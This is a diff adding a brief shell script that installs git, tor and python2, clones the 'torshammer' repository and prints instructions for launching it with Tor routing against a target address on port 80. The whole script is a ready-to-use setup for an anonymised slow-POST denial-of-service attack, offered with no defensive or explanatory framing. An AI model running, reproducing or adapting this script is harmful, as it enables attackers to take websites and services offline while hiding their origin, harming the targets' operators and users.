@@ -1,0 +1,29 @@
+
+
+ apt-get update
+
+
+apt-get -y install git
+
+
+ apt-get -y install tor
+
+
+apt-get install -y python2
+
+
+
+git clone https://github.com/dotfighter/torshammer.git
+
+cd torshammer
+
+echo "
+to start python type this
+type--~>   python2 torshammer.py -T -t  addres target 80
+and enter"
+
+
+
+
+
+
